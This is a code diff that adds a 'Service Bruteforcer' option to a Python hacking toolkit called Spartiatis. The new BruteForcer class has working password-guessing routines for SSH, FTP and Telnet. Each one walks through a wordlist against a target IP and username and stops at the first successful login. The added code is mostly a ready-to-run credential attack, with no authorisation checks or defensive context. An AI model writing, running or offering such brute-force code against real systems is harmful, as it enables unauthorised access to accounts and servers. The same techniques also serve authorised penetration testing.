@@ -3,6 +3,12 @@ import threading
 import queue
 import time
 import re
+import paramiko
+import ftplib
+import telnetlib
+import requests 
+from urllib.parse import urljoin
+
 
 
 # Main Menu 
@@ -11,6 +17,7 @@ def main():
         print("Spartiatis Toolkit")
         print("1. Port Scanner")
         print("2. Vulnerability Scanner")
+        print("3. Service Bruteforcer")
         print("6. Exit")
 
         choice = input("Select an option: ")
@@ -44,6 +51,7 @@ def main():
                     print("[!] Invalid IP address format")
                     continue
                 try:
+                    
                     octets = list(map(int, target.split('.')))
                     if not all(0 <= octet <= 255 for octet in octets):
                         raise ValueError
@@ -62,7 +70,31 @@ def main():
                 print(f"{vuln}")
             
             input("\n[+] Press Enter to return to main menu...")
+
+        elif choice == '3':
+            service = input("Service (SSH/FTP/Telnet): ").lower()
+            target = input("Target IP: ")
+            username = input("Username: ")
+            wordlist = input("Wordlist path: ")
+
+            bruteforcer = BruteForcer()
+            if service == 'ssh':
+                result = bruteforcer.ssh_bruteforce(target, username, wordlist)
+            elif service == 'ftp':
+                result = bruteforcer.ftp_bruteforce(target, username, wordlist)
+            elif service == 'telnet':
+                result = bruteforcer.telnet_bruteforce(target, username, wordlist)
+            else:
+                print("Invalid service")
+                continue  
+
+            if result:
+                print(f"Successful login: {result[0]}:{result[1]}")
+            else:
+                print("Bruteforce failed")
             
+            input("\nPress Enter to return to main menu...")
+
         elif choice == '6':
             print("Exiting...")
             break
@@ -70,8 +102,7 @@ def main():
         else:
              print("Invalid option, please try again")
              time.sleep(1)
-         
-        
+                
 # Port Scanner
 class PortScanner:
     def __init__(self):
@@ -220,6 +251,58 @@ class VulnerabilityScanner:
             elif service == 'HTTP' and port == 80:
                 vulnerabilities.append("Check for common web vulnerabilities")
         return vulnerabilities
-    
+
+# Service BruteForcer
+class BruteForcer:
+    def ssh_bruteforce(self, target, username, wordlist, port=22, timeout=5):
+        with open(wordlist, 'r') as f:
+            for password in f:
+                password = password.strip()
+                try:
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    ssh.connect(target, port=port, username=username, password=password, timeout=timeout)
+                    print(f"[+] SSH Success: {username}:{password}")
+                    ssh.close()
+                    return (username, password)
+                except:
+                    continue
+        return None
+
+    def ftp_bruteforce(self, target, username, wordlist, port=21, timeout=5):
+        with open(wordlist, 'r') as f:
+            for password in f:
+                password = password.strip()
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(target, port, timeout=timeout)
+                    ftp.login(username, password)
+                    print(f"[+] FTP Success: {username}:{password}")
+                    ftp.quit()
+                    return (username, password)
+                except:
+                    continue
+        return None
+
+    def telnet_bruteforce(self, target, username, wordlist, port=23, timeout=5):
+        with open(wordlist, 'r') as f:
+            for password in f:
+                password = password.strip()
+                try:
+                    tn = telnetlib.Telnet(target, port=port, timeout=timeout)
+                    tn.read_until(b"login: ")
+                    tn.write(username.encode('ascii') + b"\n")
+                    tn.read_until(b"Password: ")
+                    tn.write(password.encode('ascii') + b"\n")
+                    result = tn.expect([b"Login incorrect", b"Last login"], timeout=timeout)
+                    if result[0] == 1:
+                        print(f"[+] Telnet Success: {username}:{password}")
+                        tn.close()
+                        return (username, password)
+                    tn.close()
+                except:
+                    continue
+        return None
+
 if __name__ == "__main__":
     main()  
